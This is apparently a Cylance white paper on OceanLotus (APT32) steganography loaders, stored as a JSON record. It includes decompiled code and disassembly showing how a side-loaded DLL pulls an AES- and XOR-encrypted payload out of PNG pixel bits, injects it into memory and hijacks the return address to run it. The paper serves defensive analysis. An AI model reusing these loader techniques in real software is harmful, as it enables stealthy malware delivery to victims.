{
    "id": "43ce4590-b70a-4728-a5ce-1a0bed7b299b",
    "created_at": "2022-10-25T16:48:16.321456Z",
    "updated_at": "2025-03-27T02:16:28.859265Z",
    "deleted_at": null,
    "sha1_hash": "6645296c925133446d4e213a547235692761d5c2",
    "title": "OceanLotus APT Group Leveraging Steganography",
    "authors": "Cylance",
    "file_creation_date": "2019-03-28T17:17:40Z",
    "file_modification_date": "2019-03-28T17:17:43Z",
    "file_size": 2331538,
    "plain_text": "# OceanLotus Steganography\n\n\n## Malware Analysis White Paper\n\n\n-----\n\n# Contents\n\n#### Introduction..............................................................................................3\n\n Steganography Loader #1..................................................................3\n\n Overview....................................................................................................3\n\n Features.....................................................................................................3\n\n Loader Analysis.......................................................................................4\n\n Steganography Loader #2................................................................17\n\n Overview................................................................................................. 17\n\n Features.................................................................................................. 17\n\n Loader Analysis.................................................................................... 18\n\n\n#### Backdoor Launcher............................................................................ 23\n\n Initial Shellcode.................................................................................... 23\n\n Launcher DLL........................................................................................ 28\n\n Configuration........................................................................................ 33\n\n Backdoor DLL........................................................................................ 33\n\n C2 Communication Module............................................................. 34\n\n Appendix................................................................................................. 35\n\n Indicators of Compromise (IOCs).................................................. 35\n\n Hunting.................................................................................................... 36\n\n VirusTotal\b�����������������������������������������������������������������������������������������36\n\n YARA\b��������������������������������������������������������������������������������������������������36\n\n\n-----\n\n#### While continuing to monitor activity of the OceanLotus APT Group, BlackBerry Cylance researchers uncovered a novel payload loader that utilizes steganography to read an encrypted payload concealed within a .png image file. The steganography algorithm appears to be bespoke and utilizes a least significant bit approach to minimize visual differences when compared with the original image to prevent analysis by discovery tools. Once decoded, decrypted, and executed, an obfuscated loader will load one of the APT32 backdoors. Thus far, BlackBerry Cylance has observed two backdoors being used in combination with the steganography loader – a version of Denes backdoor (bearing similarities to the one described by ESET), and an updated version of Remy backdoor. However, this can be easily modified by the threat actor to deliver other malicious payloads. The complexity of the shellcode and loaders shows the group continues to invest heavily in development of bespoke tooling.\n\n This white paper describes the steganography algorithm used in two distinct loader variants and looks at the launcher of the backdoor that was encoded in one of the .png cover images.\n\n### Steganography Loader #1\n\n##### SHA256 ae1b6f50b166024f960ac792697cd688be9288601f423c15abbc755c66b6daa4\n\n Classification Malware/Backdoor\n\n Size 659 KB (674,816 bytes)\n\n Type PE32 executable for MS Windows (DLL) (console) Intel 80386 32-bit\n\n File Name mcvsocfg.dll\n\n Observed September 2018\n\n#### Overview This particular OceanLotus malware loader attempts to imitate McAfee’s McVsoCfg DLL and expects to be side-loaded by the legitimate “On Demand Scanner” executable. It arrives together with an encrypted payload stored in a separate .png image file. The .png cover file is actually a valid image file that is not malicious on its own. The payload is encoded inside this image with the use of a technique called steganography, which utilizes the least significant bits of each pixel’s color code to store hidden information, without making overtly visible changes to the picture itself. The encoded payload is additionally encrypted with AES128 and further obfuscated with XOR in an attempt to fool steganography detection tools.\n\n Features\n • Side-loaded DLL\n\n • Loads next-stage payload using custom .png steganography\n\n • Uses AES128 implementation from Crypto++ library for payload decryption\n\n • Known to load Denes backdoor, might possibly be used also with other payloads\n\n\n-----\n\n#### The malicious DLL exports the same function names as the original mcvsocfg.dll library. All exports contain the exact same code which will decrypt the payload, inject it into memory, and execute it:\n```\n int ValidateDrop()\n {\n  HANDLE v0; // ebx\n  void *v1; // edi\n  void *v2; // esi\n  DWORD dwSize; // [esp+Ch] [ebp-4h]\n  read_system_ini();\n  v0 = GetCurrentProcess();\n  v1 = (void *)decode_payload(&dwSize);\n  v2 = VirtualAllocEx(v0, 0, dwSize, 0x1000u, 0x40u);\n  WriteProcessMemory(v0, v2, v1, dwSize, 0);\n  free(v1);\n  return ((int (*)(void))v2)();\n }\n\n Figure 1. Common export entrypoint\n\n The payload is encoded inside a separate .png file using a technique called steganography. On top of that, the decoded payload is also encrypted with AES-128 and finally obfuscated with XOR 0x3B. It’s worth noting that the XOR key is not hardcoded, but instead is read from the first byte of the C:\\Windows\\system.ini file:\n\n```\n\n-----\n\n```\n int __cdecl decode_payload(unsigned int return_size)\n {\n  char xor_key; // bl\n  int result; // eax\n  void *decoded_payload; // edi\n  _BYTE *decr_payload; // esi\n  unsigned int v5; // ecx\n  void *v6; // [esp-18h] [ebp-23Ch]\n  int v7; // [esp-14h] [ebp-238h]\n  int v8; // [esp-10h] [ebp-234h]\n  int v9; // [esp-Ch] [ebp-230h]\n  size_t v10; // [esp-8h] [ebp-22Ch]\n  int v11; // [esp-4h] [ebp-228h]\n  unsigned int decrypted_size; // [esp+Ch] [ebp-218h]\n  int key_ptr; // [esp+10h] [ebp-214h]\n  int payload_size; // [esp+14h] [ebp-210h]\n  int iv_ptr; // [esp+18h] [ebp-20Ch]\n\n```\n__int16 payload_filename; // [esp+1Ch] [ebp-208h]\n```\n  char v17; // [esp+1Eh] [ebp-206h]\n\n```\npayload_filename = 0;\n```\n  memset(&v17, 0, 0x206u);\n  if ( GetModuleFileNameW((HMODULE)0x10000000, (LPWSTR)&payload_filename, 0x104u) )\n   PathRemoveFileSpecW((LPWSTR)&payload_filename);\n  PathAppendW((LPWSTR)&payload_filename, L”x5j3trra.Png”);\n  xor_key = read_system_ini();\n  payload_size = 0;\n  result = decode_payload_from_img((LPCWSTR)&payload_filename, (int)&payload_size);\n  decoded_payload = (void *)result;\n  if ( result )\n  {\n   key_ptr = 0;\n   iv_ptr = 0;\n   get_key_and_iv(&key_ptr, &iv_ptr);\n   decr_payload = cryptoPP_decrypt((int)decoded_payload, payload_size, key_ptr, iv_ptr, &decrypted_size);\n   free(decoded_payload);\n   v5 = 0;\n   if ( decrypted_size )\n   {\n    do\n      decr_payload[v5++] ^= xor_key;\n    while ( v5 < decrypted_size );\n   }\n   memmove_stuff((int)&v6, &word_1007B3BE);\n   write_pid_to_desktop_ini(v6, v7, v8, v9, v10, v11);\n   result = (int)decr_payload;\n   *return_size = decrypted_size;\n  }\n  return result;\n }\n\n#### Figure 2. Payload decoding and decryption routine\n\n```\n\n-----\n\n#### popular Japanese manga series:\n\n Figure 3. “Kaito Kid”\n\n To extract the payload, the malware will first initialize the GDI+ API and get the image width and height values:\n```\n  if ( PathFileExistsW(payload_path) )\n  {\n   gdi_input = 1;\n   DebugEventCallback = 0;\n   SuppressBackgroundThread = 0;\n   SuppressExternalCodecs = 0;\n   GdiplusStartup(&gdi_token, &gdi_input, 0);\n   gdi_struct = (gdi_struct *)GdipAlloc(16);\n   if ( gdi_struct )\n   {\n    gdi_struct->vtbl = (int)&Gdiplus::Bitmap::`vftable’;\n    bitmap = 0;\n    gdi_struct->status = GdipCreateBitmapFromFile(payload_path, &bitmap);\n    gdi_struct->bitmap = (int)bitmap;\n   }\n   else\n   {\n    gdi_struct = 0;\n   }\n   img_width = 0;\n   gpstatus = GdipGetImageWidth(gdi_struct->bitmap, &img_width);\n   if ( gpstatus )\n    gdi_struct->status = gpstatus;\n   img_height = 0;\n   gpstatus_1 = GdipGetImageHeight(gdi_struct->bitmap, &img_height);\n   if ( gpstatus_1 )\n    gdi_struct->status = gpstatus_1;\n   bitmap = 0;\n   x = 0;\n   prev_color = 0xFF000000;\n\n Figure 4. Use of GDI+ APIs\n\n```\n\n-----\n\n#### appropriate memory buffer and proceed to decode the remaining payload byte by byte:\n```\n   bitmap = 0;\n   x = 0;\n   prev_color = 0xFF000000;\n   do\n   {\n    gpstatus_2 = GdipBitmapGetPixel(gdi_struct->bitmap, x, 0, &color_1);\n    if ( gpstatus_2 )\n    {\n      gdi_struct->status = gpstatus_2;\n      argb = prev_color;\n    }\n    else\n    {\n      argb = color_1;\n      prev_color = color_1;\n    }\n    *((_BYTE *)&bitmap + x++) = BYTE2(argb) & 7 | 8 * (8 * argb | BYTE1(argb\n   }\n   while ( x < 4 );\n   size_of_bitmap = (unsigned int)bitmap;\n   v10 = (size_t)bitmap;\n   *(_DWORD *)size = bitmap;\n   v11 = malloc(v10);\n\n Figure 5. Obtaining size of the payload\n\n```\n\n-----\n\n#### subsequent pixel in the image:\n```\n  img_height_1 = img_height;\n  index = 0;\n  bitmap = v11;\n  y = 0;\n  color_1 = 0;\n  x_1 = 4;\n  if ( img_height > 0 )\n  {\n   img_width_1 = img_width;\n   do\n   {\n    if ( index >= size_of_bitmap\n     break;\n    if ( x_1 < img_width_1 )\n    {\n     do\n     {\n      if ( index >= size_of_bitmap\n       break;\n       v17 = GdipBitmapGetPixel(\n      if ( v17 )\n      {\n        gdi_struct->status = v17\n        argb_1 = prev_color;\n      }\n      else\n      {\n        argb_1 = color;\n        prev_color = color;\n      }\n      ++x_1;\n       img_width_1 = img_width;\n       bitmap[index++] = BYTE2(\n       y = color_1;\n     }\n     while ( x_1 < img_width_1\n      img_height_1 = img_height;\n    }\n    ++y;\n    x_1 = 0;\n    color_1 = y;\n   }\n   while ( y < img_height_1 );\n  }\n\n Figure 6. Steganography decoding routine\n\n```\n\n-----\n\n#### its IEND marker, and read directly from the file:\n```\n (*(void (__thiscall **)(gdi_struct *, signed int))gdi_struct->vtbl)(gdi_struct, 1);\n if ( size_of_bitmap > index )\n {\n\n```\nfile = _wfopen(payload_path, L”rb”);\n_file = file;\n```\n  if ( file )\n  {\n   fseek(file, 0, 2);\n   pos = ftell(_file);\n   fseek(_file, index - size_of_bitmap + pos, 0);\n   fread(&bitmap[index], 1u, size_of_bitmap - index, _file);\n   fclose(_file);\n  }\n }\n\n#### Figure 7. Reading the remaining payload bytes\n\n The pixel encoding algorithm is fairly straightforward and aims to minimize visual differences when compared to the original image by only modifying the least significant bits of the red, green, and blue color byte values. The alpha channel byte remains unchanged.\n\n To encode a byte of the payload, the first three bits (0-2) are stored in the red color, the next three bits (3-5) are stored in the green color, and the final two bits (6-7) are stored in the blue color. Decoding is a simple inverse operation:\n\n Figure 8. RGBA pixel decoding\n\n```\n\n-----\n\n#### following decoding:\n```\n .text:1000219B         mov   edx, eax    ; AARRGGBB\n .text:1000219D         mov   cl, al     ; BB\n .text:1000219F         shr   edx, 8     ; GG\n .text:100021A2         and   dl, 7      ; GG = GG AND 7\n .text:100021A5         shl   cl, 3      ; BB = BB SHL 3\n .text:100021A8         or   dl, cl     ; TMP = GG OR BB\n .text:100021AA         shr   eax, 16     ; RR\n .text:100021AD         shl   dl, 3      ; TMP = TMP SHL 3\n .text:100021B0         and   al, 7      ; RR AND 7\n .text:100021B2         or   dl, al     ; BYTE = TMP OR RR\n\n Figure 9. Pixel color decoding\n\n For example, an ARGB pixel value of 0xFF4086DB would yield the decoded byte 0xF0:\n\n Figure 10. ARGB pixel decoding\n\n```\n\n-----\n\n#### Figure 11. Python script for decoding payload from a .png image\n\n After decoding the .png image, the loader then proceeds to initialize the key and IV used to perform AES decryption of the encrypted payload. Both values are supplied from an array of 256 pseudo-random bytes hardcoded in the binary’s .rdata section. The first two bytes of that array specify the relative offsets to the key and IV respectively:\n\n\n-----\n\n```\n .rdata:1007B588 offset_of_key  db 0A4h         ; DATA XREF: get_key_and_iv↑r\n .rdata:1007B588                     ; get_key_and_iv+D↑o ...\n .rdata:1007B589 offset_of_iv  db 32h\n .rdata:1007B58A         db 6Eh, 1Fh, 0F7h, 0E5h, 27h, 0C5h, 0EEh, 0B8h, 0C8h, 9Bh\n .rdata:1007B58A         db 6Ch, 7Dh, 0D1h, 0F6h, 55h, 3Eh, 76h, 0B7h, 72h, 90h\n .rdata:1007B58A         db 0Ah, 0E6h, 90h, 0DEh, 0DDh, 1Ah, 0D9h, 10h, 2, 98h\n .rdata:1007B58A         db 0E1h, 0CDh, 49h, 0B5h, 0FBh, 0F6h, 1Ch, 99h, 0E1h, 0E9h\n .rdata:1007B58A         db 2Ah, 0FFh, 0F0h, 5, 0C1h, 65h, 0C1h, 0EAh\n .rdata:1007B5BA aes_iv     db 0EDh, 47h, 0B1h, 0BEh, 4Eh, 0A9h, 34h, 87h, 8Fh, 18h\n .rdata:1007B5BA         db 8, 0Dh, 0EBh, 0DDh, 0B6h, 2Fh\n .rdata:1007B5CA         db 0BAh, 9Fh, 34h, 1Ch, 0FAh, 5Fh, 21h, 0DDh, 0D6h, 89h\n .rdata:1007B5CA         db 66h, 0Ah, 0F6h, 8Ah, 1Ch, 77h, 58h, 0EFh, 22h, 0BBh\n .rdata:1007B5CA         db 0E7h, 22h, 7Eh, 9Fh, 80h, 74h, 67h, 4, 91h, 0D4h\n .rdata:1007B5CA         db 0FDh, 4Ch, 49h, 0C1h, 4Bh, 22h, 30h, 0A5h, 0EFh, 8Eh\n .rdata:1007B5CA         db 25h, 0D3h, 0E7h, 0C5h, 43h, 2Ah, 91h, 4, 0FBh, 90h\n .rdata:1007B5CA         db 0B4h, 0FBh, 0BBh, 0FBh, 47h, 97h, 20h, 95h, 9Bh, 86h\n .rdata:1007B5CA         db 0F7h, 1Dh, 4Ch, 2, 8Bh, 19h, 0C1h, 35h, 3Fh, 0FAh\n .rdata:1007B5CA         db 47h, 0B2h, 0FFh, 94h, 96h, 14h, 3Ah, 0B9h, 5Bh, 56h\n .rdata:1007B5CA         db 0E2h, 62h, 8, 0, 1Fh, 1, 91h, 4Eh, 79h, 0B3h\n .rdata:1007B5CA         db 2, 9Bh, 0Ah, 69h, 96h, 7, 87h, 0E5h\n .rdata:1007B62C aes_key     db 3Ah, 2Ah, 68h, 5Ch, 0C4h, 1, 48h, 1, 0FBh, 26h\n .rdata:1007B62C         db 65h, 33h, 5Dh, 67h, 39h, 44h\n .rdata:1007B63C         db 0A3h, 94h, 15h, 4Bh, 0E3h, 89h, 87h, 73h, 0BBh, 8Ch\n .rdata:1007B63C         db 0F7h, 0ACh, 0A8h, 96h, 0FDh, 8Eh, 8Ch, 55h, 7Eh, 31h\n .rdata:1007B63C         db 0EEh, 86h, 9Eh, 6, 0B7h, 1Dh, 5, 6Ah, 0E9h, 45h\n .rdata:1007B63C         db 56h, 9Bh, 61h, 0C6h, 0C5h, 1, 0F1h, 3Bh, 2, 0B0h\n .rdata:1007B63C         db 0A2h, 0F5h, 0A0h, 38h, 9, 9Ch, 59h, 65h, 29h, 0D6h\n .rdata:1007B63C         db 0A6h, 7, 0E8h, 8, 56h, 1Dh, 0F6h, 0Eh, 93h, 0C5h\n .rdata:1007B63C         db 84h, 1Dh, 8Ah, 76h, 35h, 5Ch, 4Ah, 0E1h, 0D1h, 0FBh\n .rdata:1007B63C         db 9Dh, 51h, 52h, 0CEh, 8Fh, 0F8h\n\n#### Figure 13. AES key and IV inside an array of 256 pseudo-random bytes\n\n The loader uses the AES128 implementation from the open-source Crypto++[2] library, which is instantiated in the following manner:\n CBC_Mode<AES>::Decryption *AESDecryption = new CBC_Mode<AES>::Decryption((BYTE*)key, 16, iv);\n AESDecryption->ProcessData((byte *)decrypted, (byte *)encrypted, length);\n\n Figure 14. Crypto++ interface\n\n```\n\n-----\n\n#### appear that the malware authors have modified much of the original code. A SimpleKeyringInterface class is used to initialize the key, while the IV is passed to the SetCipherWithIV function:\n```\n .text:100028BE         lea   ecx, [esp+208h+cipher_struct]\n .text:100028C5         mov   [esp+208h+var_1E8], 0Fh\n .text:100028CD         mov   [esp+208h+decrypted_size], 0\n .text:100028D5         mov   byte ptr [esp+208h+decrypted_payload_buf], 0\n .text:100028DA         call  cryptlib_algorithm_constructor\n .text:100028DF         push  dword_1009D664-2664h ; params 0x1009B004 -> 0x1007B6C8\n .text:100028DF                     ; get_NameValuePairs\n .text:100028E5         lea   ecx, [esp+20Ch+cipher_struct]\n .text:100028EC         mov   [esp+20Ch+cipher_struct], offset aes_vftable\n .text:100028F7         push  16       ; key_len\n .text:100028F9         push  [ebp+key_ptr]  ; key\n .text:100028FC         mov   [esp+214h+decrypt_vftable], offset aesdec_vftable\n .text:10002907         call  SimpleKeyingInterface__SetKey\n .text:1000290C         push  0        ; int feedbackSize\n .text:1000290E         push  [ebp+iv_ptr]  ; const byte *iv\n .text:10002911         lea   eax, [esp+210h+cipher_struct]\n .text:10002918         push  eax       ; &cipher\n .text:10002919         lea   ecx, [esp+214h+cbc_struct]\n .text:1000291D         call  SetCipherWithIV\n\n Figure 15. Algorithm and key initialization\n\n The decryption is performed with the use of the StreamTransformationFilter class with the StreamTransformation cipher set to AES CBC decryption mode:\n .text:10002953 loc_10002953:              ; CODE XREF: cryptoPP_stuff+9F↑j\n .text:10002953         push  5        ; paddingScheme\n .text:10002955         push  esi       ; StringSink(decrypted)\n .text:10002956         lea   eax, [esp+210h+decryptor]\n .text:1000295A         push  eax       ; 0x1007B838 CryptoPP::CBC_Decryption::`vftable’\n .text:1000295B         lea   ecx, [esp+214h+StreamTransformationFilter]\n .text:1000295F         call  decFilter    ; StreamTransformationFilter decFilter(*decryptor,\n .text:1000295F                     ; new StringSink(decrypted),\n .text:1000295F                     ; paddingScheme);\n .text:10002964         mov   eax, [esp+208h+StreamTransformationFilter]\n .text:10002968         lea   ecx, [esp+208h+StreamTransformationFilter]\n .text:1000296C         push  1        ; blocking\n .text:1000296E         push  0        ; messageEnd\n .text:10002970         push  [ebp+enc_size] ; length\n .text:10002973         push  [ebp+enc_payload] ; inString\n .text:10002976         call  [eax+StreamTransformationFilter.Put2] ; decrypt buffer\n .text:10002976                     ; 0x10003870 BufferedTransformation__Put2\n .text:10002979         mov   eax, [esp+208h+StreamTransformationFilter]\n .text:1000297D         lea   ecx, [esp+208h+StreamTransformationFilter]\n .text:10002981         push  1\n .text:10002983         push  0FFFFFFFFh\n .text:10002985         push  0\n .text:10002987         push  0\n .text:10002989         call  [eax+StreamTransformationFilter.Put2]\n\n Figure 16. Payload decryption with the use of CryptoPP StreamTransformationFilter class\n\n```\n\n-----\n\n#### implementation of the cryptographic function:\n```\n .text:1000B6C0 Rijndael_Dec_AdvancedProcessBlocks proc near\n .text:1000B6C0                    \n .text:1000B6C0\n .text:1000B6C0 ib       = dword ptr 4\n .text:1000B6C0 xb       = dword ptr 8\n .text:1000B6C0 outBlocks    = dword ptr 0Ch\n .text:1000B6C0 length     = dword ptr 10h\n .text:1000B6C0 flags      = dword ptr 14h\n .text:1000B6C0\n .text:1000B6C0         cmp   g_x86DetectionDone,\n .text:1000B6C7         push  esi\n .text:1000B6C8         mov   esi, ecx\n .text:1000B6CA         jnz   short loc_1000B6D1\n .text:1000B6CC         call  DetectX86Features\n .text:1000B6D1\n .text:1000B6D1 loc_1000B6D1:             \n .text:1000B6D1         cmp   g_hasAESNI, 0\n .text:1000B6D8         push  [esp+4+flags]\n .text:1000B6DC         push  [esp+8+length]\n .text:1000B6E0         push  [esp+0Ch+outBlocks]\n .text:1000B6E4         push  [esp+10h+xb]\n .text:1000B6E8         push  [esp+14h+ib]\n .text:1000B6EC         jz   short loc_1000B703\n .text:1000B6EE         push  [esi+cipher.rounds]\n .text:1000B6F1         push  [esi+cipher.sk]\n .text:1000B6F7         call  \n .text:1000B6FC         add   esp, 1Ch\n .text:1000B6FF         pop   esi\n .text:1000B700         retn  14h\n .text:1000B703 ; -------------------------------------------------------------------------- .text:1000B703\n .text:1000B703 loc_1000B703:             \n https://en.wikipedia.org/wiki/Kaito_Kuroba\n .text:1000B703         mov   ecx, esi\n .text:1000B705         call  decrypt_no_AESNI\n .text:1000B70A         pop   esi\n .text:1000B70B         retn  14h\n .text:1000B70B Rijndael_Dec_AdvancedProcessBlocks endp\n\n Figure 17. CPU features check and call to the AES decryption routine\n\n```\n\n-----\n\n#### Intel and AMD CPUs:\n```\n .text:1002AC90 aes_decrypt_loop:            ; CODE XREF: AESNI_Dec_4_Blocks+67↑j\n .text:1002AC90                     ; AESNI_Dec_4_Blocks+B0↓j\n .text:1002AC90         dec   [esp+8+arg_4]\n .text:1002AC94         lea   edi, [edi+10h]\n .text:1002AC97         movdqa xmm1, xmmword ptr [edi-10h]\n .text:1002AC9C         movdqa xmm0, xmmword ptr [ecx]\n .text:1002ACA0         aesdec xmm0, xmm1\n .text:1002ACA5         movdqa xmmword ptr [ecx], xmm0\n .text:1002ACA9         movdqa xmm0, xmmword ptr [edx]\n .text:1002ACAD         aesdec xmm0, xmm1\n .text:1002ACB2         movdqa xmmword ptr [edx], xmm0\n .text:1002ACB6         movdqa xmm0, xmmword ptr [esi]\n .text:1002ACBA         aesdec xmm0, xmm1\n .text:1002ACBF         movdqa xmmword ptr [esi], xmm0\n .text:1002ACC3         movdqa xmm0, xmmword ptr [eax]\n .text:1002ACC7         aesdec xmm0, xmm1\n .text:1002ACCC         movdqa xmmword ptr [eax], xmm0\n .text:1002ACD0         jnz   short aes_decrypt_loop\n .text:1002ACD2         mov   edi, [esp+8+arg_14]\n\n Figure 18. Use of Intel AES-NI instruction set\n\n The decrypted payload undergoes one final transformation, where it is XORed with the first byte read from the C:\\Windows\\system. ini file, which is expected to begin with a comment character ‘;’ (0x3B):\n .text:100023A0 dexor_loop:               ; CODE XREF: decode_payload+CB↑j\n .text:100023A0                     ; decode_payload+DB↓j\n .text:100023A0         xor   [ecx+esi], bl  ; first byte of system.ini file (0x3B)\n .text:100023A3         lea   eax, [ecx+esi]\n .text:100023A6         inc   ecx\n .text:100023A7         cmp   ecx, [esp+224h+decrypted_size]\n .text:100023AB         jb   short dexor_loop\n\n Figure 19. Removing the final layer of payload obfuscation\n\n```\n\n-----\n\n#### with a call immediate opcode sequence:\n\n Figure 20. Decrypting first block of payload using CyberChef\n\n\n-----\n\n### g g p y\n\n##### SHA256 4c02b13441264bf18cc63603b767c3d804a545a60c66ca60512ee59abba28d4d\n\n Classification Malware/Backdoor\n\n Size 658 KB (674,304 bytes)\n\n Type PE32 executable for MS Windows (DLL) (console) Intel 80386 32-bit\n\n File Name Varies\n\n Observed September 2018\n\n#### Overview While this loader differs somewhat in general implementation, the payload extraction routine seems to be the same as in the previous variant. The main differences are:\n\n • The way the decryption routine is called (from within the DllMain function, as opposed to an exported function)\n\n • The way the payload is invoked (by overwriting the return address on the stack, as opposed to a direct call)\n\n • Implementation of an additional anti-analysis check that compares the name of the parent process to a string stored in an encrypted resource\n\n We came across multiple variations of this DLL containing different parent process names, possibly targeted specifically to the victim’s environment. Some of these names include processes related to security software:\n\n • wsc_proxy.exe\n\n • plugins-setup.exe\n\n • SoftManager.exe\n\n • GetEFA.exe\n\n Features\n • Side-loaded DLL\n\n • Anti-debugging/anti-sandboxing check for parent process name\n\n • Loads next-stage payload using custom .png steganography\n\n • Uses AES128 implementation from Crypto++ library for payload decryption\n\n • Executes the payload by overwriting the return address on the stack\n\n • Known to load an updated version of Remy backdoor\n\n\n-----\n\n#### This DLL does not contain an export table and its entire functionality resides in the DllMain routine:\n```\n .text:10077D50 ; BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n .text:10077D50 _DllMain@12   proc near        ; CODE XREF: ___DllMainCRTStartup+6D↑p\n .text:10077D50                     ; ___DllMainCRTStartup+85↑p\n .text:10077D50\n .text:10077D50 hinstDLL    = dword ptr 4\n .text:10077D50 fdwReason    = dword ptr 8\n .text:10077D50 lpvReserved   = dword ptr 0Ch\n .text:10077D50\n .text:10077D50         dec   [esp+fdwReason]\n .text:10077D54         mov   eax, [esp+hinstDLL]\n .text:10077D58         mov   hinstDll, eax\n .text:10077D5D         jnz   short ret_1\n .text:10077D5F         push  eax       ; hModule\n .text:10077D60         call  check_parent_name\n .text:10077D65         add   esp, 4\n .text:10077D68         test  eax, eax\n .text:10077D6A         jz   short ret_1\n .text:10077D6C         push  offset decode_inject_payload ; int\n .text:10077D71         call  overwrite_return_addr\n .text:10077D76         add   esp, 4\n .text:10077D79         test  eax, eax\n .text:10077D7B         jz   short ret_1\n .text:10077D7D         sub   esp, 18h\n .text:10077D80         mov   ecx, esp    ; int\n .text:10077D82         push  offset word_10091BCA ; void *\n .text:10077D87         call  memmove_stuff\n .text:10077D8C         call  write_pid_to_desktop_ini\n .text:10077D91         add   esp, 18h\n .text:10077D94\n .text:10077D94 ret_1:                 ; CODE XREF: DllMain(x,x,x)+D↑j\n .text:10077D94                     ; DllMain(x,x,x)+1A↑j ...\n .text:10077D94         mov   eax, 1\n .text:10077D99         retn  0Ch\n .text:10077D99 _DllMain@12   endp\n\n Figure 21. Variant #2 DllMain function\n\n Upon execution, the malware will first decrypt a string from its resources and compare it against the name of the parent process. If the names differ, the malware will simply exit without touching the payload. The resource containing the expected process name (ICON/1) is XORed with the first byte of the legitimate C:\\Windows\\system.ini file – 0x3B (“;”):\n\n Figure 22. Obfuscated file name in ICON/1 resource\n\n```\n\n-----\n\n```\n .text:10002140         mov   edx, [esp+18h+xor_key] ; first byte of system.ini (0x3B)\n .text:10002144\n .text:10002144 decrypt_resource:            ; CODE XREF: check_parent_name+7D↓j\n .text:10002144         xor   [ecx+ebx], dl  ; ebx = resource\n .text:10002147         lea   eax, [ecx+ebx]\n .text:1000214A         inc   ecx\n .text:1000214B         cmp   ecx, ebp\n .text:1000214D         jb   short decrypt_resource\n .text:1000214F\n .text:1000214F loc_1000214F:              ; CODE XREF: check_parent_name+6E↑j\n .text:1000214F         push  104h      ; unsigned int\n .text:10002154         mov   byte ptr [ebx+ebp], 0\n .text:10002158         call  ??_U@YAPAXI@Z  ; operator new[](uint)\n .text:1000215D         add   esp, 4\n .text:10002160         mov   esi, eax\n .text:10002162         push  104h      ; nSize\n .text:10002167         push  esi       ; lpFilename\n .text:10002168         push  0        ; hModule\n .text:1000216A         call  ds:GetModuleFileNameA\n .text:10002170         test  eax, eax\n .text:10002172         jz   short loc_1000218E\n .text:10002174         push  esi       ; pszPath\n .text:10002175         call  ds:PathFindFileNameA\n .text:1000217B         push  eax       ; module file name\n .text:1000217C         push  ebx       ; decrypted resource\n .text:1000217D         call  ds:lstrcmpiA  ; check if the filename in the resource\n .text:1000217D                     ; is the same as module filename\n .text:10002183         xor   ecx, ecx\n .text:10002185         test  eax, eax\n .text:10002187         cmovnz edi, ecx\n .text:1000218A         mov   [esp+18h+retval], edi\n\n#### Figure 23. Parent process name comparison\n\n```\n\n-----\n\n#### parent process’s text section:\n```\n .text:10002492        \n .text:10002493        \n .text:10002494         call  \n .text:10002499         add   esp,\n .text:1000249C         mov   [ebp+\n .text:1000249F         mov   eax, [ebp+\n .text:100024A2         test  eax, eax\n .text:100024A4         jz   short\n .text:100024A6         mov   edx, [ebp+\n .text:100024A9         push  ebx\n .text:100024AA         mov   ebx, [ebp+\n .text:100024AD         push  edi\n .text:100024AE         mov   edi, [ebp+\n .text:100024B1\n .text:100024B1 find_return_address\n .text:100024B1        \n .text:100024B1                    \n .text:100024B3         test  ecx, ecx\n .text:100024B5         jz   short\n .text:100024B7         lea   esi, [eax+\n .text:100024BA        \n .text:100024BC         cmp   [ebp+\n .text:100024BF        \n .text:100024C1         cmp   eax, edi\n .text:100024C3         jb   short\n .text:100024C3                    \n .text:100024C5\n .text:100024C5 loc_100024C5:             \n .text:100024C5        \n .text:100024C5                    \n .text:100024C7         mov   [ebp+\n .text:100024CA         mov   ecx, [esi]\n .text:100024CC         cmp   ebx, ecx\n .text:100024CE         ja   short\n .text:100024D0         cmp   ecx, edx\n .text:100024D2         jnb   short\n .text:100024D4         sub   eax,\n .text:100024D7         mov   [ebp+\n .text:100024DA\n .text:100024DA next:                 \n .text:100024DA                    \n .text:100024DA        \n .text:100024DC         jnz   short\n\n Figure 24. Finding the return address on the stack\n\n```\n\n-----\n\n#### instance, the payload is fully contained within the image’s pixel color codes, leaving no remaining data beyond the IEND marker:\n\n Figure 25. Image containing encoded payload\n\n Finally, the loader will decrypt the payload to a memory buffer and overwrite the previously found return address with the pointer to that buffer, ensuring that the malicious shellcode will be executed when the DLL attempts to return to the caller:\n```\n .text:100024E7 call_decrypt_function:         ; CODE XREF: overwrite_return_addr+A3↑j\n .text:100024E7         call  [ebp+decrypt_payload_function]\n .text:100024EA         pop   edi\n .text:100024EB         mov   [esi], eax   ; overwrite return address\n .text:100024EB                     ; with injected payload ptr\n .text:100024ED         mov   eax, 1\n .text:100024F2         pop   ebx\n .text:100024F3         pop   esi\n .text:100024F4         mov   esp, ebp\n .text:100024F6         pop   ebp\n .text:100024F7         retn\n .text:100024F7 overwrite_return_addr endp\n\n Figure 26. Overwriting return address with pointer to the decrypted payload\n\n```\n\n-----\n\n#### to load older versions of Remy backdoor. In this instance, the shellcode is configured to load an encoded backdoor from within the payload:\n\n Figure 27. Decoding process\n\n\n-----\n\n#### The final payload comes in a form of a launcher DLL that contains an encrypted backdoor in its .rdata section and a plain-text configuration in its resources. The resources also store one or more C2 communication modules. The backdoor DLL and the C2 communication DLLs are heavily obfuscated using high quantities of junk code, which significantly inflates their size and makes both static analysis and debugging more difficult.\n\n In addition to Denes and Remy backdoors, at least two different communication modules were observed with different versions of this launcher – DNSProvider and HTTPProv.\n\n Initial Shellcode The launcher binary, which contains the final backdoor, is RC4 encrypted and wrapped in a layer of obfuscated shellcode. We can see the familiar DOS stub in plain text, but the rest of the header and binary body are encrypted:\n```\n 022A0000 E8 E2 7A 16 00 FE FE FE FE DD 38 64 17 4C 32 BD èâz..þþþþÝ8d.L2½\n 022A0010 47 84 50 D4 10 7B D3 63 37 E3 D5 27 4B A2 65 BA G„PÔ.{Óc7ãÕ’K¢eº\n 022A0020 07 F7 3B 3C 9E 3A 5A 82 69 47 62 B8 1D 59 B2 B9 .÷;<ž:Z‚iGb¸.Y²¹\n\n```\n`022A0030 7D 55 61 C9 80 C9 EC 22 3B 8A 34 CC EE 76 82 3E` }UaÉ€Éì”;Š4Ìîv‚>\n```\n 022A0040 48 5C F3 93 D2 6C 91 ED 21 A8 24 F7 C1 E7 62 4A H\\ó“Òl‘í!¨$÷ÁçbJ\n 022A0050 7A CF 51 46 E2 D1 51 A1 DB 33 31 7B CB 1F 4C D7 zÏQFâÑQ¡Û31{Ë.L×\n 022A0060 13 AB FF 31 11 31 8B F8 C6 B3 CC CF 4C 99 B6 